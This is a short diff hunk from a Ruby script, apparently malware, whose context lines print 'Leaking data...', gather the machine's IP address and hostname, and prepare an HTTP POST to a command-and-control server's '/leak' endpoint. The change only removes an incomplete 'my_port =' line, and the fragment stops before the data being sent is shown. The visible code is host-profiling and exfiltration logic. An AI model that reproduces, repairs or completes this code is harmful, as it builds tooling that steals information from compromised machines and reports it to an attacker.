@@ -30,7 +30,6 @@ my_key = response.body.to_s
 puts "Leaking data..."
 my_ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
 my_hostname = Socket.gethostname
-my_port = 
 uri = URI.parse("http://#{$c2_server}/leak")
 request = Net::HTTP::Post.new(uri)
 request.set_form_data(
